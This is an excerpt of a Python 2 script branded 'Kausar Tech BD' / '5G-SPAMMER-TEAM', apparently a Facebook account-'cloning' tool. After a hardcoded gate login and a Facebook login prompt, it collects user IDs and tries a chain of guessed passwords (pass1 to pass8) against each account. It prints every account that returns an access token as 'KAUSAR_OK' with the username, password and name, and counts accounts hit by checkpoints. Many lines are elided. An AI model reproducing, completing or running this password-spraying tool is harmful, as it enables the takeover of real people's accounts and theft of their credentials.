...
jalan("\033[1;97m•◈•───────•◈ Kausar Tech BD Please SUBSCRIBE  •◈•───────•◈•")  

 
jalan("   \033[1;92m Assalamualaikum everone ")	
jalan("   \033[1;96m Wifi users use any vpn connect ")	

jalan("   \033[1;96m Welcome to Kausar Tech BD ")

jalan("\033[1;92m•◈•──────────•◈•\033[1;96m5G-SPAMMER-TEAM\033[1;96m•◈•──────────•◈•")

CorrectUsername = "Kausar"
CorrectPassword = "Tech-BD"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;92 m[☆] \x1b[1;97mUSER ID \x1b[1;92m>>>> ")
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open http://www.youtube.com/channel/UC83st544vzS0gNIgkZdzbSA')
    else:
...
def login():
	...
	try:
		...
		id = raw_input('          \033[1;97m[◉] \033[1;97mUID/Email \x1b[1;91m: \x1b[1;92m')
		...
		if 'checkpoint' in url:
			...
			print("\n\033[1;96mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def menu():
	...
	print "\033[1;32;40m[2] \033[1;33;40m══Update Kausar Tech BD"																														
...
def pilih_super():
	...
	if peak =="":
		...
		jalan('\033[1;97m[✺]Cloning start getting ids \033[1;97m...')
	...
	jalan('                    \033[1;96mKausar Tech BD start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass1 + ' 👽 ' + b['name']
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass2 + ' 👽 ' + b['name']
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass3 + ' 👽 ' + b['name']
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[KAUSAR_OK] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass8 + ' 👽 ' + b['name']
	...
	print "\033[1;32;40m[+] Total KAUSAR_OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
